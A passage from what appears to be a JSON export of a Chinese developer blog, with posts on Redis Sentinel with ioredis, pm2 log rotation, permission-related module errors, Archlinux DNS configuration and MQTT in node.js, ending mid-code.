，将上一节 <code>访问单实例node.js</code> 中redis封装代码改成支持 <code>Sentinel</code>\n</p>\n</div>\n\n<div id=\"outline-container-sec-2-1\" class=\"outline-3\">\n<h3 id=\"sec-2-1\">database.js</h3>\n<div class=\"outline-text-3\" id=\"text-2-1\">\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\"><span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">Redis</span> = require(<span style=\"color: #66cccc;\">'ioredis'</span>);\n\n<span style=\"color: #99cc99;\">function</span> <span style=\"color: #f99157;\">Database</span>() {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">self</span> = <span style=\"color: #6699cc;\">this</span>;\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   self._redis_options = {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   name: <span style=\"color: #66cccc;\">'mymaster'</span>,\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   sentinels: [{\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   host: <span style=\"color: #66cccc;\">'127.0.0.1'</span>,\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   port: 5000\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }, {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   host: <span style=\"color: #66cccc;\">'127.0.0.1'</span>,\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   port: 5001\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }],\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   db: 2\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   };\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   self._redis = <span style=\"color: #6699cc;\">null</span>;\n}\n\nDatabase.<span style=\"color: #6699cc;\">prototype</span>.redis = <span style=\"color: #99cc99;\">function</span>(<span style=\"color: #ffcc66;\">callback</span>) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">self</span> = <span style=\"color: #6699cc;\">this</span>;\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span><span style=\"color: #99cc99;\">if</span> (! self._redis) {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   self._redis = <span style=\"color: #99cc99;\">new</span> <span style=\"color: #6699cc;\">Redis</span>(self._redis_options);\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   }\n\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   <span style=\"color: #99cc99;\">return</span> callback(<span style=\"color: #6699cc;\">null</span>, self._redis);\n};\n\nmodule.exports = <span style=\"color: #99cc99;\">new</span> <span style=\"color: #6699cc;\">Database</span>();\n</pre>\n</div>\n\n<p>\n和使用 <a href=\"https://github.com/NodeRedis/node_redis\">node_redis</a> 的 <code>database.js</code> 对照一下，可以发现 <a href=\"http://github.com/luin/ioredis/\">ioredis</a> 连接 <code>redis</code> 时，支持 <code>db</code> 选项，可以省去调用 <code>select</code> 。\n</p>\n\n<p>\n值得注意的是 <a href=\"https://github.com/NodeRedis/node_redis\">node_redis</a> 最近开始支持连接 <code>redis</code> 时指定 <code>db</code> 选项，见 <a href=\"https://github.com/NodeRedis/node_redis/commit/a4285c156c5b8964d92a36bd7f361a6f40e2449a\">Parse redis url just like IANA · NodeRedis/node_redis@a4285c1</a> ，\n使用该特性时请安装最新版的 <a href=\"https://github.com/NodeRedis/node_redis\">node_redis</a> 。\n</p>\n\n<blockquote>\n<p>\ndb: null; If set, client will run redis select command on connect. This is not recommended.\n</p>\n</blockquote>\n<p>\n引用自 <a href=\"https://github.com/NodeRedis/node_redis#rediscreateclient\">redis.createClient()文档</a>\n</p>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2-2\" class=\"outline-3\">\n<h3 id=\"sec-2-2\">启动 Redis 及 Sentinel</h3>\n<div class=\"outline-text-3\" id=\"text-2-2\">\n<p>\n启动上一篇文章《 <a href=\"http://blog.kankanan.com/article/redis-9ad853ef7528602765b96848ff1a-sentinel.html\">redis高可用性方案：Sentinel</a> 》配置好的 <code>Sentinel</code>\n</p>\n\n<ul class=\"org-ul\">\n<li><code>Master</code> <code>redis-server ./redis-master.conf</code> \n</li>\n\n<li><code>Slave</code> <code>redis-server ./redis-slave.conf</code>\n</li>\n\n<li><code>Sentinel a</code> <code>redis-sentinel ./redis-sentinel-a.conf</code>\n</li>\n\n<li><code>Sentinel b</code> <code>redis-sentinel ./redis-sentinel-b.conf</code>\n</li>\n\n<li><code>Sentinel c</code> <code>redis-sentinel ./redis-sentinel-c.conf</code>\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2-3\" class=\"outline-3\">\n<h3 id=\"sec-2-3\">演示运行</h3>\n<div class=\"outline-text-3\" id=\"text-2-3\">\n<p>\n运行演示脚本\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-sh\"><span id=\"coderef-master_write\" class=\"coderef-off\"><span class=\"linenr\">1: </span>node client.js &amp;</span>\n<span id=\"coderef-wait_sync\" class=\"coderef-off\"><span class=\"linenr\">2: </span>sleep 1</span>\n<span id=\"coderef-slave_read\" class=\"coderef-off\"><span class=\"linenr\">3: </span>redis-cli -p 6380 -n 2 get hello</span>\n<span id=\"coderef-failover\" class=\"coderef-off\"><span class=\"linenr\">4: </span>redis-cli -p 6379 debug sleep 30 &amp;</span>\n</pre>\n</div>\n\n<dl class=\"org-dl\">\n<dt> 行 <a href=\"#coderef-master_write\"class=\"coderef\" onmouseover=\"CodeHighlightOn(this, 'coderef-master_write');\" onmouseout=\"CodeHighlightOff(this, 'coderef-master_write');\">1</a> </dt><dd>运行 <code>client.js</code> 在 <code>Master</code> 写入键值\n</dd>\n\n<dt> 行 <a href=\"#coderef-wait_sync\"class=\"coderef\" onmouseover=\"CodeHighlightOn(this, 'coderef-wait_sync');\" onmouseout=\"CodeHighlightOff(this, 'coderef-wait_sync');\">2</a> </dt><dd>等待 <code>Master</code> 同步数据到 <code>Slave</code>\n</dd>\n\n<dt> 行 <a href=\"#coderef-slave_read\"class=\"coderef\" onmouseover=\"CodeHighlightOn(this, 'coderef-slave_read');\" onmouseout=\"CodeHighlightOff(this, 'coderef-slave_read');\">3</a> </dt><dd>从 <code>Slave</code> 读取键值\n</dd>\n\n<dt> 行 <a href=\"#coderef-failover\"class=\"coderef\" onmouseover=\"CodeHighlightOn(this, 'coderef-failover');\" onmouseout=\"CodeHighlightOff(this, 'coderef-failover');\">4</a> </dt><dd>触发故障切换\n</dd>\n</dl>\n\n<p>\n演示脚本运行结果\n</p>\n\n<pre class=\"example\">\n<span id=\"coderef-slave_read_result\" class=\"coderef-off\"><span class=\"linenr\">5: </span>\"world\"</span>\n<span id=\"coderef-slave_read_status\" class=\"coderef-off\"><span class=\"linenr\">6: </span>OK</span>\n<span id=\"coderef-master_read\" class=\"coderef-off\"><span class=\"linenr\">7: </span>hello: world</span>\n</pre>\n\n<dl class=\"org-dl\">\n<dt> 行 <a href=\"#coderef-slave_read_result\"class=\"coderef\" onmouseover=\"CodeHighlightOn(this, 'coderef-slave_read_result');\" onmouseout=\"CodeHighlightOff(this, 'coderef-slave_read_result');\">5</a> </dt><dd>演示脚本行 <a href=\"#coderef-slave_read\"class=\"coderef\" onmouseover=\"CodeHighlightOn(this, 'coderef-slave_read');\" onmouseout=\"CodeHighlightOff(this, 'coderef-slave_read');\">3</a> 的redis命令执行结果\n</dd>\n\n<dt> 行 <a href=\"#coderef-slave_read_status\"class=\"coderef\" onmouseover=\"CodeHighlightOn(this, 'coderef-slave_read_status');\" onmouseout=\"CodeHighlightOff(this, 'coderef-slave_read_status');\">6</a> </dt><dd>演示脚本行 <a href=\"#coderef-slave_read\"class=\"coderef\" onmouseover=\"CodeHighlightOn(this, 'coderef-slave_read');\" onmouseout=\"CodeHighlightOff(this, 'coderef-slave_read');\">3</a> 的redis命令执行状态\n</dd>\n\n<dt> 行 <a href=\"#coderef-master_read\"class=\"coderef\" onmouseover=\"CodeHighlightOn(this, 'coderef-master_read');\" onmouseout=\"CodeHighlightOff(this, 'coderef-master_read');\">7</a> </dt><dd>演示脚本行 <a href=\"#coderef-master_write\"class=\"coderef\" onmouseover=\"CodeHighlightOn(this, 'coderef-master_write');\" onmouseout=\"CodeHighlightOff(this, 'coderef-master_write');\">1</a> 后台运行结束时输出的键值，此时由于主备已切换，是从新的 <code>Master</code> （原 <code>Slave</code> ）上获取的\n</dd>\n</dl>\n</div>\n</div>\n</div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">参考</h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<p>\n<a href=\"https://github.com/luin/ioredis/blob/master/README.md#sentinel\">ioredis Sentinel</a></p>\n</div>\n</div>\n"
},
{
  "title": "控制pm2的日志文件大小",
  "timestamp": "2015-12-25 18:41:00",
  "tags": [
    "node",
    "pm2"
  ],
  "body": "<p>\n下班前发现线上服务器的 <code>100G</code> 磁盘只有 <code>10%</code> 空闲空间了，检查了一下是 <code>pm2</code> 的日志文件（在 <code>~/.pm2/logs</code> 目录下）占用的。\n</p>\n\n<p>\n参考帖子 <a href=\"https://github.com/Unitech/pm2/issues/535\">Limit logs size? · Issue #535 · Unitech/pm2</a> 安装 <a href=\"https://www.npmjs.com/package/pm2-logrotate\">pm2-logrotate</a> <code>pm2 install pm2-logrotate</code> ，\n</p>\n\n<p>\n安装完成后，观察到正在按时间切分成多个日志文件，但空闲空间在迅速减少，眼看就要低于 <code>5%</code> 了，要是磁盘满了会影响关键的 <code>redis</code> 数据库，\n</p>\n\n<p>\n立即手工将日志文件全部删除，但是磁盘空闲空间在继续减少，明白是 <code>pm2</code> 或者 <code>pm2-logrotate</code> 打开了日志文件导致空间无法释放，\n</p>\n\n<p>\n立即执行 <code>pm2 kill</code> ， 等 <code>crontab</code> 将服务重新拉起，一分钟后确认危机解决。好在这台服务器上的 <code>node.js</code> 服务都不是很关键，\n</p>\n\n<p>\n没有造成太大影响，圣诞节快乐:)\n</p>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">今天（2016-02-16）运维人员发现pm2的日志快占满磁盘</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<p>\n<a href=\"https://www.npmjs.com/package/pm2-logrotate\">pm2-logrotate</a> （当前版本为1.3.1） 默认情况下，并未限制日志文件数，旧的日志文件未自动删除释放空间，需要设置 retain 配置项：\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\">pm2 set pm2-logrotate:retain 100\n</pre>\n</div>\n\n<p>\n这样最多会保留 100 个日志文件。\n</p>\n\n<p>\nmax_size 配置项默认是 10MB，并不意味着切割出来的日志文件大小一定就是 10MB，而是检查时发现日志文件大小达到 max_size，则触发日志切割。\n</p>\n\n<p>\ninterval 和 interval_unit 配置项指定了按时间维度进行日志切割。\n</p>\n\n<p>\n切割是指将日志文件内容移到名称为 &lt;project name&gt;-out__YYYY-MM-DD-HH-mm.log 的日志文件中，所以日志文件大小往往是超过 max_size 的。\n</p>\n\n<p>\n由于默认配置 interval 为 1， interval_unit 为 DD，所以每天至少会切割一次日志，每分钟当发现日志大小超过 10MB，也会触发一次日志切割。\n</p>\n\n<p>\npm2-logrotate 现阶段小问题还是比较多的（详见项目的 <a href=\"https://github.com/pm2-hive/pm2-logrotate/issues\">issues</a> ），如：\n</p>\n\n<ul class=\"org-ul\">\n<li>日志文件日期始终是前一天，日志文件大小超过 max_size 触发日志切割时，文件名中的日期也为前一天不合理了。\n\n<p>\n详见 <a href=\"https://github.com/pm2-hive/pm2-logrotate/issues/18\">Fast growing log files may be overwritten #18</a>\n</p>\n</li>\n\n<li>如果日志文件写得很快，切割时有可能因为日志文件名冲突，导致同名的旧日志文件被覆盖。\n\n<p>\n详见 <a href=\"https://github.com/pm2-hive/pm2-logrotate/issues/17\">Rotated files date #17</a>\n</p>\n</li>\n\n<li>pm2 开启 merge_logs 时，日志会重复\n\n<p>\n详见 <a href=\"https://github.com/pm2-hive/pm2-logrotate/issues/14\">logrotate rotate the log multiple times if merge_logs is true #14</a>\n</p>\n</li>\n\n<li>无法精确限制日志占用空间。\n\n<p>\n不过 logrotate 工具也不能，所以也不算是个严重的问题。\n</p>\n</li>\n</ul>\n\n<p>\n更好的方式可能是使用操作系统的 logrotate 服务。</p>\n</div>\n</div>\n"
},
{
  "title": "修复文件目录权限引起的错误：Cannot find module",
  "timestamp": "2015-12-28 15:28:00",
  "tags": [
    "node",
    "pm2"
  ],
  "body": "<p>\n<code>node.js</code> 应用部署后多次遇到这种错误：\n</p>\n\n<pre class=\"example\">\nError: Cannot find module '../encodings'\n      at Function.Module._resolveFilename (module.js:338:15)\n      at Function.Module._load (module.js:289:25)\n      at Function._load (/usr/local/www.xxxxxxxx.com/node_modules/pm2/node_modules/pmx/lib/transaction.js:62:21)\n      at Module.require (module.js:366:17)\n      at require (module.js:385:17)\n      at Object.getCodec (/usr/local/www.xxxxxxxx.com/node_modules/koa-body/node_modules/co-body/node_modules/raw-body/node_modules/iconv-lite/lib/index.js:61:27)\n      at Object.getDecoder (/usr/local/www.xxxxxxxx.com/node_modules/koa-body/node_modules/co-body/node_modules/raw-body/node_modules/iconv-lite/lib/index.js:118:23)\n      at getDecoder (/usr/local/www.xxxxxxxx.com/node_modules/koa-body/node_modules/co-body/node_modules/raw-body/index.js:44:18)\n      at readStream (/usr/local/www.xxxxxxxx.com/node_modules/koa-body/node_modules/co-body/node_modules/raw-body/index.js:218:15)\n      at executor (/usr/local/www.xxxxxxxx.com/node_modules/koa-body/node_modules/co-body/node_modules/raw-body/index.js:110:5)\n</pre>\n\n<p>\n下意识地以为是 <code>node.js</code> 版本用错了（ <code>npm install</code> 和运行时的 <code>node.js</code> 版本不一致），删除 <code>node_modules</code> 重新 <code>npm install</code> 后还是一样的问题。\n</p>\n\n<p>\n查了一下源代码，找到了出错位置 <code>node_modules/koa-body/node_modules/co-body/node_modules/raw-body/node_modules/iconv-lite/lib/index.js:61</code> ：\n</p>\n\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\"><span style=\"color: #99cc99;\">if</span> (!iconv.encodings)\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   iconv.encodings = require(<span style=\"color: #66cccc;\">\"../encodings\"</span>); <span style=\"color: #999999; font-style: italic;\">// </span><span style=\"color: #999999; font-style: italic;\">Lazy load all encoding definit</span><span style=\"color: #999999; font-style: italic; text-decoration: underline;\">ions.</span>\n</pre>\n</div>\n\n<p>\n这是延迟加载模块，代码本身没有错， <code>../encodings</code> 模块是存在的，以前也有遇到类似问题，不过是在 <code>node.js</code> 一启动就报错，因为系统默认的权限太严格了（如： <code>umask</code> 为 <code>0022</code> ），\n<code>npm install</code> 安装的 <code>node_modules</code> 其它用户（如： <code>nobody</code> ）没有访问权限。这次是在处理用户请求过程中报错，考虑到上面的模块是延迟加载，\n在初始化完成与监听端口处理用户请求的代码之间，我的代码有 <code>setuid</code> 到 <code>nobody</code> 的逻辑，应该还是文件目录权限引起。\n</p>\n\n<p>\n最终发现是 <code>/usr/local/www.xxxxxxxx.com</code> 在创建时因为系统默认的权限设置太严格（ <code>umask</code> 为 <code>0022</code> ），导致 <code>nobody</code> 用户无法访问，改一下目录权限后问题修复。</p>\n"
},
{
  "title": "Archlinux下解决上网慢问题",
  "timestamp": "2015-12-30 10:17:00",
  "tags": [
    "archlinux",
    "network"
  ],
  "body": "<p>\n发现  <code>Firefox</code> 的状态栏长时间显示 <code>Looking up www.xxxx.com ...</code> ，应该是我的电脑的 <code>DNS</code> 配置出问题了。\n</p>\n\n<p>\n<code>/etc/resolv.conf</code> 内容如下：\n</p>\n\n<pre class=\"example\">\n# Generated by resolvconf\nsearch lan\nnameserver 8.8.8.8\nnameserver 192.168.111.1\n</pre>\n\n<p>\n<code>/etc/resolvconf.conf</code> 内容如下：\n</p>\n\n<pre class=\"example\">\nresolv_conf=/etc/resolv.conf\nname_servers=8.8.8.8\n</pre>\n\n<p>\n我配置的是使用静态DNS <code>8.8.8.8</code> ，但是 <code>/etc/resolv.conf</code> 文件内容多出了两项，怀疑是 <code>search lan</code> 引起。\n</p>\n\n<p>\n很多的网络管理工具都会去改动 <code>/etc/resolv.conf</code> 文件，如 <code>pdnsd</code> <code>dnsmasq</code> <code>NetworkManager</code> 。\n</p>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">禁止 <code>NetworkManager</code> 改动 <code>/etc/resolv.conf</code></h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<ul class=\"org-ul\">\n<li>修改 <code>/etc/NetworkManager/NetworkManager.conf</code> 配置\n\n<p>\n<code>dns=none</code>\n</p>\n</li>\n\n<li>重新载入 <code>systemd</code> 配置\n\n<p>\n<code>sudo systemctl daemon-reload</code>\n</p>\n</li>\n\n<li>重启 <code>NetworkManager</code>\n\n<p>\n<code>sudo systemctl restart NetworkManager</code>\n</p>\n</li>\n\n<li>重新生成 <code>/etc/resolv.conf</code>\n\n<p>\n<code>sudo resolvconf -u</code>\n</p>\n\n<pre class=\"example\">\n# Generated by resolvconf\nnameserver 8.8.8.8\n</pre>\n\n<p>\n现在可以正常上网了。\n</p>\n\n<p>\n但是静态DNS <code>8.8.8.8</code> 不太稳定，最好换成优先使用DHCP分配的本地DNS。\n</p>\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">使用DHCP分配的本地DNS</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<ul class=\"org-ul\">\n<li>撤销之前对 <code>/etc/NetworkManager/NetworkManager.conf</code> 的修改\n\n<p>\n<code>dns=default</code>\n</p>\n</li>\n\n<li>去掉 <code>/etc/resolvconf.conf</code> 配置的静态DNS\n\n<pre class=\"example\">\nresolv_conf=/etc/resolv.conf\n#name_servers=8.8.8.8\n</pre>\n</li>\n\n<li>重新载入 <code>systemd</code> 配置\n\n<p>\n<code>sudo systemctl daemon-reload</code>\n</p>\n</li>\n\n<li>重启 <code>NetworkManager</code>\n\n<p>\n<code>sudo systemctl restart NetworkManager</code>\n</p>\n</li>\n\n<li>重新生成 <code>/etc/resolv.conf</code>\n\n<p>\n<code>sudo resolvconf -u</code>\n</p>\n\n<pre class=\"example\">\n# Generated by resolvconf\nnameserver 192.168.111.1\n</pre>\n\n<p>\n过一会儿 <code>/etc/resolv.conf</code> 内容自动被更新\n</p>\n\n<pre class=\"example\">\n# Generated by resolvconf\nsearch lan\nnameserver 192.168.111.1\n</pre>\n\n<p>\n<code>search lan</code> 又出现了， <code>NetworkManager</code> 貌似是通过 <code>dhclient</code> 对 <code>/etc/resolv.conf</code> 进行修改的，\n具体指令参见 <code>/sbin/dhclient-script</code> 。\n</p>\n\n<p>\n上网又很流畅了，看来之前上网慢是由 <code>8.8.8.8</code> DNS服务器抽风引起，与 <code>search lan</code> 配置无关。\n</p>\n</li>\n</ul>\n</div>\n</div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">参考</h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<p>\n<a href=\"https://wiki.archlinux.org/index.php/Resolv.conf#Preserve_DNS_settings\">resolv.conf - ArchWiki</a></p>\n</div>\n</div>\n"
},
{
  "title": "mqtt协议一瞥",
  "timestamp": "2016-01-05 11:16:00",
  "tags": [
    "network",
    "IoT"
  ],
  "body": "<blockquote>\n<p>\nIoT是Internet of Things的缩写，字面翻译是“物体组成的因特网”，准确的翻译应该为“物联网”。物联网(Internet Of Things)又称传感网，简要讲就是互联网从人向物的延伸。\n</p>\n</blockquote>\n<p>\n引用自 <a href=\"http://baike.baidu.com/subview/2831030/13489169.htm\">IOT（物联网）_百度百科</a>\n</p>\n\n\n<blockquote>\n<p>\nMQTT is a machine-to-machine (M2M)/\"Internet of Things\" connectivity protocol. It was designed as an extremely lightweight publish/subscribe messaging transport. It is useful for connections with remote locations where a small code footprint is required and/or network bandwidth is at a premium. For example, it has been used in sensors communicating to a broker via satellite link, over occasional dial-up connections with healthcare providers, and in a range of home automation and small device scenarios. It is also ideal for mobile applications because of its small size, low power usage, minimised data packets, and efficient distribution of information to one or many receivers.\n</p>\n</blockquote>\n<p>\n引用自 <a href=\"http://mqtt.org/\">mqtt.org</a>\n</p>\n\n\n<blockquote>\n<p>\nMQTT（Message Queuing Telemetry Transport，消息队列遥测传输）是IBM开发的一个即时通讯协议，有可能成为物联网的重要组成部分。\n</p>\n</blockquote>\n<p>\n引用自 <a href=\"http://baike.baidu.com/view/9956531.htm\">MQTT_百度百科</a>\n</p>\n\n\n<blockquote>\n<p>\nMQTT is a lightweight messaging protocol that is based on publish/subscribe pattern. Due to its low overhead and simplicity, this protocol is suitable for use in IoT and M2M applications. \n</p>\n</blockquote>\n<p>\n引用自 <a href=\"http://www.bitreactive.com/mqtt-request-response/\">Request/Response Pattern Over MQTT | Bitreactive</a>\n</p>\n\n\n<blockquote>\n<p>\nMQTT - MQ Telemetry Transport\n</p>\n\n<p>\n轻量级的 Machine-to-Machine 通信协议。\nPublish/Subscribe模式。\n基于TCP/IP。\n支持QoS。\n适合于低带宽、不可靠连接、嵌入式设备、CPU内存资源紧张。\n是一种比较不错的Android消息推送方案。\nFacebookMessenger采用了MQTT。\nMQTT有可能成为物联网的重要协议。\n</p>\n</blockquote>\n<p>\n引用自 <a href=\"http://www.cnblogs.com/caca/p/mqtt.html\">MQTT协议简记 - cacard - 博客园</a>\n</p>\n\n<blockquote>\n<p>\nWhy MQTT?\n</p>\n\n<p>\nIt is a publish/subscribe protocol\nIt has Multiple Quality of Service levels (QOS)\nIt has at-least-once and exactly-once semantics\nIt has a low overhead (2 bytes at minimum)\nIt supports offline messaging\nIt retains messages, like a key/value store\n</p>\n</blockquote>\n<p>\n引用自 <a href=\"http://thejackalofjavascript.com/getting-started-mqtt/\">Getting started with MQTT | The Jackal of Javascript</a>\n</p>\n\n\n<p>\n<span class=\"underline\">简言之， <code>mqtt</code> 就是简单高效基于 <code>发布/订阅</code> 的 <code>消息传输协议</code> ，主要用于资源受限设备（如：传感器、手机等）与服务器间有保障地进行消息或事件推送。</span>\n</p>\n\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">有一些人（或项目）在尝试将 <code>mqtt</code> 扩展到其它用途</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<dl class=\"org-dl\">\n<dt> 请求/响应模型（Request/Response） </dt><dd><a href=\"http://www.bitreactive.com/mqtt-request-response/\">Request/Response Pattern Over MQTT | Bitreactive</a>\n</dd>\n</dl>\n\n\n<dl class=\"org-dl\">\n<dt> 远程过程调用（RPC） </dt><dd><a href=\"https://github.com/wolfeidau/mqtt-rpc\">wolfeidau/mqtt-rpc</a>\n</dd>\n</dl>\n\n\n<dl class=\"org-dl\">\n<dt> 包裹WEB服务（REST） </dt><dd><a href=\"http://bytecontinnum.com/2014/12/consuming-mobile-apis-with-mqtt-reqres-pattern/\">REST over MQTT for Constrained Devices/Mobiles | Prithiviraj Damodaran</a>\n</dd>\n</dl>\n</div>\n</div>\n\n\n<div id=\"outline-container-sec-2\" class=\"outline-2\">\n<h2 id=\"sec-2\">IoT领域的其它竞争对手</h2>\n<div class=\"outline-text-2\" id=\"text-2\">\n<dl class=\"org-dl\">\n<dt> <a href=\"https://tools.ietf.org/html/rfc7252\">CoAP</a> </dt><dd>Constrained Applications Protocol\n\n<p>\n基于 <code>UDP</code> 协议，简化版的 <a href=\"https://tools.ietf.org/html/draft-ietf-httpbis-http2\">HTTP/2</a> 。\n</p>\n\n<blockquote>\n<p>\nThe Constrained Application Protocol (CoAP) is a specialized web transfer protocol for use with constrained nodes and constrained networks in the Internet of Things.\nThe protocol is designed for machine-to-machine (M2M) applications such as smart energy and building automation.\n</p>\n</blockquote>\n<p>\n引用自  <a href=\"http://coap.technology/\">CoAP — Constrained Application Protocol</a>\n</p>\n</dd>\n</dl>\n\n\n<dl class=\"org-dl\">\n<dt> <a href=\"https://tools.ietf.org/html/draft-ietf-httpbis-http2\">HTTP/2</a> </dt><dd>HTTP/2 (originally named HTTP/2.0) is the second major version of the HTTP network protocol used by the World Wide Web\n\n<p>\n<a href=\"http://timkellogg.me/blog/2015/02/20/can-http2-replace-mqtt/\">Can HTTP/2 Replace MQTT? - Tim Kellogg</a>\n</p>\n\n<p>\n<a href=\"http://www.limmat.co/2015/02/18/http-2-the-new-iot-protocol/\">HTTP/2 - The New IoT Protocol?</a>\n</p>\n\n<p>\n<a href=\"http://robbysimpson.com/2015/01/26/http2-and-the-internet-of-things/\">HTTP/2 and the Internet of Things</a>\n</p>\n\n<p>\n<a href=\"https://systembash.com/mqtt-vs-websockets-vs-http2-the-best-iot-messaging-protocol/\">MQTT vs Websockets vs HTTP/2: The Best IoT Messaging Protocol?</a>\n</p>\n\n<p>\n<a href=\"http://webofthings.org/2015/10/25/http2-for-internet-of-things-1/\">What’s in HTTP/2 for the Internet of Things? 1/2 | Web of Things</a>\n</p>\n</dd>\n</dl>\n</div>\n</div>\n\n<div id=\"outline-container-sec-3\" class=\"outline-2\">\n<h2 id=\"sec-3\">个人总结</h2>\n<div class=\"outline-text-2\" id=\"text-3\">\n<p>\n<a href=\"https://tools.ietf.org/html/draft-ietf-httpbis-http2\">HTTP/2</a> 做为一种通用的应用层协议，由于被广泛部署，有着天然的优势，但是 <code>mqtt</code> 带来的 <code>Machine-To-Machine</code> 、 <code>offline</code> 、 <code>bridge</code>  消息传输，现在就可以应用到产品中。\n</p>\n\n<p>\n或许将来有一天会出现构建于 <a href=\"https://tools.ietf.org/html/draft-ietf-httpbis-http2\">HTTP/2</a> 上的类 <code>mqtt</code> 解决方案，它能够运行在绝大多数的资源内限嵌入式设备上，在这之前 <code>mqtt</code> 之类的成熟的应用层协议会有一席之地，特别是在它完美契合你的应用的情况下。\n</p>\n\n<p>\n做为一个开发者，与其坐等完美的解决方案出现，还不如立即开始学习 <code>mqtt</code> ，应用 <code>mqtt</code> ，从 <code>mqtt</code> 中学到协议设计的经验与技术，以至成为实现构建于 <a href=\"https://tools.ietf.org/html/draft-ietf-httpbis-http2\">HTTP/2</a> 上的类 <code>mqtt</code> 解决方案的那个人。</p>\n</div>\n</div>\n"
},
{
  "title": "node.js下进行mqtt实践",
  "timestamp": "2016-02-21 13:13:00",
  "tags": [
    "network",
    "IoT",
    "node"
  ],
  "body": "<p>\n通过 mqtt 可以将设备连接在一起，能够实现将消息（可能来自服务器也可能来自其它设备）推送到设备，如果设备离线，\n服务器可以暂存消息，在设备上线时再推送，有一些特性很关键：\n</p>\n\n<ul class=\"org-ul\">\n<li>offline\n\n<p>\n允许设备暂时离线。\n</p>\n\n<p>\n即使是使用固定宽带，有些用户也会因为各种原因无法保持稳定的长连接，可能是上级路由设备有限制，或者是带宽被其它应用抢占而导致长连接不稳定。\n将设备的在线状态与 TCP 长连接状态耦合在一起是不明智的。\n</p>\n</li>\n\n<li>bridge\n\n<p>\n设备连接在不同的 broker 上，通过 bridge 实现互通。\n</p>\n\n<p>\n支持几万台设备在线，估计一台 broker 就够了，但是一旦达到数十万、百万甚至上亿，肯定需要搭建 broker 集群，参见 <a href=\"http://www.kegel.com/c10k.html\">The C10K problem</a>。\n</p>\n</li>\n</ul>\n\n<p>\n简单起见， node.js 服务器端使用 <a href=\"https://github.com/mcollina/mosca\">mosca</a>， 客户端使用 <a href=\"https://github.com/mqttjs/MQTT.js\">MQTT.js</a> ，由于 <a href=\"https://github.com/mcollina/mosca\">mosca</a> 不支持 bridge，本文不涉及 bridge 特性。\n</p>\n\n<div id=\"outline-container-sec-1\" class=\"outline-2\">\n<h2 id=\"sec-1\">客户端与服务器通信</h2>\n<div class=\"outline-text-2\" id=\"text-1\">\n<ul class=\"org-ul\">\n<li>客户端通过服务器给自已发个消息\n\n<p>\n<code>server.js</code>\n</p>\n<div class=\"org-src-container\">\n\n<pre class=\"src src-js\"><span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">mosca</span> = require(<span style=\"color: #66cccc;\">'mosca'</span>);\n\n<span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">settings</span> = {\n<span style=\"color: #999999; background-color: #2d2d2d;\"> </span>   port: 1883\n};\n\n<span style=\"color: #99cc99;\">var</span> <span style=\"color: #ffcc66;\">server</span> = <span style=\"color: #99cc99;\">new</span> <span style=\"color: #6699cc;\">mosca.Server</span>(settings);\nserver.on(<span style=\"color: #66cccc;\">'ready'</span>, <span style=\"color: #99cc99;\">function</span> () {\n<span 